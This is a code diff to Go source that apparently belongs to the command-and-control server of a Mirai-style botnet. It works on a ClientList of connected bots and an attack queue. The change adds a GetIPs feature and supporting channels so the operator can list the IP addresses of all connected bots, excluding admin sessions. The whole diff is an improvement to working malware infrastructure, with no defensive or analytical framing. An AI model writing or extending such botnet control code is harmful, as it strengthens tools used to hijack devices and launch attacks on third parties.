@@ -1,6 +1,7 @@
 package main
 
 import (
+    "net"
     "time"
     "math/rand"
     "sync"
@@ -24,11 +25,27 @@ type ClientList struct {
     cntView     chan int
     distViewReq chan int
     distViewRes chan map[string]int
+    ipViewReq   chan int       // request bot IP list
+    ipViewRes   chan []string  // response bot IP list
     cntMutex    *sync.Mutex
 }
 
 func NewClientList() *ClientList {
-    c := &ClientList{0, 0, make(map[int]*Bot), make(chan *Bot, 128), make(chan *Bot, 128), make(chan *AttackSend), make(chan int, 64), make(chan int), make(chan int), make(chan map[string]int), &sync.Mutex{}}
+    c := &ClientList{
+        uid:         0,
+        count:       0,
+        clients:     make(map[int]*Bot),
+        addQueue:    make(chan *Bot, 128),
+        delQueue:    make(chan *Bot, 128),
+        atkQueue:    make(chan *AttackSend),
+        totalCount:  make(chan int, 64),
+        cntView:     make(chan int),
+        distViewReq: make(chan int),
+        distViewRes: make(chan map[string]int),
+        ipViewReq:   make(chan int),
+        ipViewRes:   make(chan []string),
+        cntMutex:    &sync.Mutex{},
+    }
     go c.worker()
     go c.fastCountWorker()
     return c
@@ -40,6 +57,16 @@ func (this *ClientList) Count() int {
 
     this.cntView <- 0
     return <-this.cntView
+}
+
+// GetIPs returns the list of remote IP addresses for all currently connected bots.
+// IPs are extracted directly from the Go runtime TCP socket (conn.RemoteAddr),
+// so they are always accurate and strictly bot-only (admins are excluded).
+func (this *ClientList) GetIPs() []string {
+    this.cntMutex.Lock()
+    defer this.cntMutex.Unlock()
+    this.ipViewReq <- 0
+    return <-this.ipViewRes
 }
 
 func (this *ClientList) Distribution() map[string]int {
@@ -124,6 +151,21 @@ func (this *ClientList) worker() {
                 }
             }
             this.distViewRes <- res
+        case <-this.ipViewReq:
+            ips := make([]string, 0, len(this.clients))
+            for _, v := range this.clients {
+                tcpAddr, ok := v.conn.RemoteAddr().(*net.TCPAddr)
+                if !ok {
+                    continue
+                }
+                ip := tcpAddr.IP
+                // Normalise IPv4-mapped IPv6 (::ffff:x.x.x.x) to plain IPv4
+                if ip4 := ip.To4(); ip4 != nil {
+                    ip = ip4
+                }
+                ips = append(ips, ip.String())
+            }
+            this.ipViewRes <- ips
         }
     }
 }
